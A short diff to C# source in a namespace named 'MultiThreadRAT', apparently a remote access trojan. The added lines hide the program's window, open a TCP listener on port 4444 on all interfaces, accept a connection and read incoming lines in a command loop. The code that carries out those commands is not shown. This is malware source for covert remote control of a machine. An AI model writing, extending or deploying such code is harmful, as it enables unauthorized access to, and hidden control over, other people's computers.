@@ -30,6 +30,14 @@ namespace MultiThreadRAT
 
         private void Form1_Shown(object sender, EventArgs e)
         {
+            this.Hide();
+            tcpListener = new TcpListener(System.Net.IPAddress.Any, 4444);
+            tcpListener.Start();
+            RunServer();            
+        }
+
+        private void RunServer()
+        {
             socketForClient = tcpListener.AcceptSocket();
             networkStream = new NetworkStream(socketForClient);
             streamReader = new StreamReader(networkStream);
@@ -39,7 +47,7 @@ namespace MultiThreadRAT
                 string line;
 
                 // Command loop
-                while(true)
+                while (true)
                 {
                     line = "";
                     line = streamReader.ReadLine();
